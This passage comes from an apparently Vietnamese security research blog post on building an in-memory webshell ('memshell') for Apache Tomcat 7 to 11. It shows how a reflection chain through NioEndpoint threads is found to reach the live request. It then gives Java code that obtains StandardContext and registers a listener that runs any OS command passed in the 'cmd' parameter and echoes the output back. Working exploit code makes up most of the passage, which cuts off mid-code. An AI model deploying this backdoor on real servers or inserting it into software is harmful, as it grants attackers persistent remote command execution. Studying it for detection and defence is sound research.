</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">private</span> <span style="color:#66d9ef">boolean</span> dispatcherWrapsSameObject <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">;</span>
</span></span></code></pre></div><p>Do đó không còn sử dụng được cách này, mình sẽ đi tìm chain mới chỉ riêng cho tomcat 10 và 11. Có thể sử dụng tool <a href="https://github.com/c0ny1/java-object-searcher">Java Object Searcher</a> để tìm trong <code>Thread.currentThread()</code> object <code>Request</code> (có được object này thì lấy <code>Response</code> và <code>StandardContext</code> không còn là vấn đề).</p>
<p>Để chạy thì khá đơn giản, git clone project về và pack thành file jar với jdk version ứng với jdk chạy tomcat (chỉ cần jdk 8, 17 là đủ). Thêm file jar trên vào folder <code>ext</code> của jdk8 hoặc vào classpath qua argument đối với jdk17 rồi chạy code sau trong app tomcat để search field type tồn tại chữ <code>Request</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#75715e">// object searcher
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Set the search type to include the Request keyword
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>List<span style="color:#f92672">&lt;</span>Keyword<span style="color:#f92672">&gt;</span> keys <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ArrayList<span style="color:#f92672">&lt;&gt;();</span>
</span></span><span style="display:flex;"><span>keys<span style="color:#f92672">.</span><span style="color:#a6e22e">add</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> Keyword<span style="color:#f92672">.</span><span style="color:#a6e22e">Builder</span><span style="color:#f92672">().</span><span style="color:#a6e22e">setField_type</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Request&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">build</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Create a new breadth-first search for Thread.currentThread()
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>SearchRequstByBFS searcher <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SearchRequstByBFS<span style="color:#f92672">(</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">currentThread</span><span style="color:#f92672">(),</span> keys<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>searcher<span style="color:#f92672">.</span><span style="color:#a6e22e">setIs_debug</span><span style="color:#f92672">(</span><span style="color:#66d9ef">false</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Digging depth is 20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>searcher<span style="color:#f92672">.</span><span style="color:#a6e22e">setMax_search_depth</span><span style="color:#f92672">(</span><span style="color:#ae81ff">20</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">//Set the report save location
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// searcher.setReport_save_path(&#34;results.txt&#34;);
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>searcher<span style="color:#f92672">.</span><span style="color:#a6e22e">searchObject</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// end object searcher
</span></span></span></code></pre></div><p>Output file sẽ nằm ở folder <code>bin</code> của tomcat. Tìm được cùng chain sau trên các version:</p>
<pre tabindex="0"><code>TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---&gt; group = {java.lang.ThreadGroup} 
   ---&gt; threads = {class [Ljava.lang.Thread;} 
    ---&gt; [15] = {java.lang.Thread} 
     ---&gt; target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---&gt; this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---&gt; connections = {java.util.Map&lt;U, org.apache.tomcat.util.net.SocketWrapperBase&lt;S&gt;&gt;} 
        ---&gt; [java.nio.channels.SocketChannel[connected local=/127.0.0.1:8080 remote=/127.0.0.1:61064]] = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper} 
         ---&gt; socket = {org.apache.tomcat.util.net.NioChannel} 
          ---&gt; appReadBufHandler = {org.apache.coyote.http11.Http11InputBuffer} 
            ---&gt; request = {org.apache.coyote.Request} 
             ---&gt; notes = {class [Ljava.lang.Object;} 
              ---&gt; [1] = {org.apache.catalina.connector.Request}
</code></pre><p>Phần còn lại chỉ là dùng reflection để lấy từng field tương ứng:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Object <span style="color:#a6e22e">getFieldValueByObj</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Field f <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    String pwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Thread<span style="color:#f92672">[]</span> threads <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Thread<span style="color:#f92672">[])</span> getFieldValueByObj<span style="color:#f92672">(</span>Thread<span style="color:#f92672">.</span><span style="color:#a6e22e">currentThread</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getThreadGroup</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;threads&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Thread t <span style="color:#f92672">:</span> threads<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Runnable target <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                target <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Runnable<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>t<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;target&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>target <span style="color:#66d9ef">instanceof</span> NioEndpoint<span style="color:#f92672">.</span><span style="color:#a6e22e">Poller</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                NioEndpoint nio <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>NioEndpoint<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>target<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;this$0&#34;</span><span style="color:#f92672">);</span> <span style="color:#75715e">// this$0 ~ outer class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#75715e">// current open connections, we need to get exact one we make
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>SocketWrapperBase<span style="color:#f92672">&lt;</span>NioChannel<span style="color:#f92672">&gt;</span> n<span style="color:#f92672">:</span> nio<span style="color:#f92672">.</span><span style="color:#a6e22e">getConnections</span><span style="color:#f92672">())</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Http11InputBuffer h11pIn <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Http11InputBuffer<span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>n<span style="color:#f92672">.</span><span style="color:#a6e22e">getSocket</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;appReadBufHandler&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    org<span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">coyote</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Request</span> req <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>org<span style="color:#f92672">.</span><span style="color:#a6e22e">apache</span><span style="color:#f92672">.</span><span style="color:#a6e22e">coyote</span><span style="color:#f92672">.</span><span style="color:#a6e22e">Request</span><span style="color:#f92672">)</span> getFieldValueByObj<span style="color:#f92672">(</span>h11pIn<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;request&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    Request req1 <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>Request<span style="color:#f92672">)</span> req<span style="color:#f92672">.</span><span style="color:#a6e22e">getNote</span><span style="color:#f92672">(</span><span style="color:#ae81ff">1</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>req1<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        req1<span style="color:#f92672">.</span><span style="color:#a6e22e">getResponse</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getWriter</span><span style="color:#f92672">().</span><span style="color:#a6e22e">write</span><span style="color:#f92672">(</span>req1<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>                        <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">}</span>
</span></span></code></pre></div><h3 id="merge-poc-obtain-standardcontext-and-inject-memshell">merge PoC, obtain StandardContext and inject memshell</h3>
<p>PoC trên chỉ đang là tomcat echo, mục tiêu là inject memshell. Như thường lệ, ta cần lấy được <code>StandardContext</code>, việc này khá đơn giản khi đã có <code>request</code> object, có thể dùng lại method ở phần jsp. Ở đây chỉ cần sửa từ <code>HttpServletRequest</code> sang <code>ServletRequest</code> là được (<code>HttpServletRequest</code> là subclass của <code>ServletRequest</code>)
Còn lại, để inject memshell, chỉ cần gọi <code>stdCtx.addApplicationEventListener(new EventListener(response))</code> như cũ.</p>
<p>Và để shell có thể chạy từ tomcat 7-11, cần nhúng hai PoC lại với nhau (mình dùng <code>try/catch</code>). Nhưng do ở PoC tomcat echo 10, 11, nhiều class mới không tồn tại ở các version cũ hơn nên không thể compile, cần chuyển code về dạng reflection hoặc né các class này ra trong code bằng cách pass argument trực tiếp để né type check:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MemEventListener</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    Field <span style="color:#a6e22e">getStaticFieldModified</span><span style="color:#f92672">(</span>String clsName<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>clsName<span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Field modifiersF <span style="color:#f92672">=</span> Field<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;modifiers&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        modifiersF<span style="color:#f92672">.</span><span style="color:#a6e22e">setInt</span><span style="color:#f92672">(</span>f<span style="color:#f92672">,</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">getModifiers</span><span style="color:#f92672">()</span> <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span>Modifier<span style="color:#f92672">.</span><span style="color:#a6e22e">FINAL</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    Object <span style="color:#a6e22e">getFieldValueByObj</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">,</span> String fieldName<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Field f <span style="color:#f92672">=</span> obj<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">().</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span>fieldName<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> f<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// in case method in parent class
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Object <span style="color:#a6e22e">invokeMethodByClsName</span><span style="color:#f92672">(</span>String clsName<span style="color:#f92672">,</span> Object obj<span style="color:#f92672">,</span> String name<span style="color:#f92672">,</span> Class<span style="color:#f92672">&lt;?&gt;...</span> params<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        Method m <span style="color:#f92672">=</span> Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>clsName<span style="color:#f92672">).</span><span style="color:#a6e22e">getDeclaredMethod</span><span style="color:#f92672">(</span>name<span style="color:#f92672">,</span> params<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        m<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>params<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">);</span> <span style="color:#75715e">// just4getNote
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> m<span style="color:#f92672">.</span><span style="color:#a6e22e">invoke</span><span style="color:#f92672">(</span>obj<span style="color:#f92672">,</span> params<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    StandardContext <span style="color:#a6e22e">getStdCtx</span><span style="color:#f92672">(</span>ServletRequest request<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            Field appCtxFacadeField <span style="color:#f92672">=</span> ApplicationContextFacade<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            Field appCtxField <span style="color:#f92672">=</span> ApplicationContext<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredField</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;context&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">setAccessible</span><span style="color:#f92672">(</span><span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#f92672">(</span>StandardContext<span style="color:#f92672">)</span> appCtxField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>appCtxFacadeField<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletContext</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    String pwd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">EventListener</span> <span style="color:#66d9ef">implements</span> ServletRequestListener <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">private</span> ServletResponse response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#a6e22e">EventListener</span><span style="color:#f92672">(</span>ServletResponse response<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span> <span style="color:#f92672">=</span> response<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestDestroyed</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">@Override</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">requestInitialized</span><span style="color:#f92672">(</span>ServletRequestEvent sre<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;request Initialized&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                HttpServletRequest request <span style="color:#f92672">=</span> <span style="color:#f92672">(</span>HttpServletRequest<span style="color:#f92672">)</span> sre<span style="color:#f92672">.</span><span style="color:#a6e22e">getServletRequest</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">)</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Process ps <span style="color:#f92672">=</span> Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">getRuntime</span><span style="color:#f92672">().</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">(</span>request<span style="color:#f92672">.</span><span style="color:#a6e22e">getParameter</span><span style="color:#f92672">(</span>pwd<span style="color:#f92672">));</span>
</span></span><span style="display:flex;"><span>                    BufferedReader br <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> BufferedReader<span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> InputStreamReader<span style="color:#f92672">(</span>ps<span style="color:#f92672">.</span><span style="color:#a6e22e">getInputStream</span><span style="color:#f92672">()));</span>
</span></span><span style="display:flex;"><span>                    ServletOutputStream out <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">response</span><span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputStream</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    String s <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    String output <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">while</span> <span style="color:#f92672">((</span>s <span style="color:#f92672">=</span> br<span style="color:#f92672">.</span><span style="color:#a6e22e">readLine</span><span style="color:#f92672">())</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                        output <span style="color:#f92672">+=</span> s <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">print</span><span style="color:#f92672">(</span>output<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">flush</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                    out<span style="color:#f92672">.</span><span style="color:#a6e22e">close</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span> <span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    MemEventListener<span style="color:#f92672">()</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>            ServletRequest request <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            ServletResponse response <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            Field sameF <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                sameF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;WRAP_SAME_OBJECT&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                Field requestF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedRequest&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                Field responseF <span style="color:#f92672">=</span> getStaticFieldModified<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;lastServicedResponse&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">((</span><span style="color:#66d9ef">boolean</span><span style="color:#f92672">)</span>sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">false</span><span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    sameF<span style="color:#f92672">.</span><span style="color:#a6e22e">setBoolean</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">true</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                    requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                    responseF<span style="color:#f92672">.</span><span style="color:#a6e22e">set</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">new</span>  ThreadLocal <span style="color:#f92672">&lt;&gt;());</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                request <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>ThreadLocal<span style="color:#f92672">&lt;</span>ServletRequest<span style="color:#f92672">&gt;)</span> requestF<span style="color:#f92672">.</span><span style="color:#a6e22e">get</span><span style="color:#f92672">(</span><span style="color:#66d9ef">null</span><span style="color:#f92672">)).</span><span style="color:#a6e22e">get</span><span style="color:#f92672">();</span>
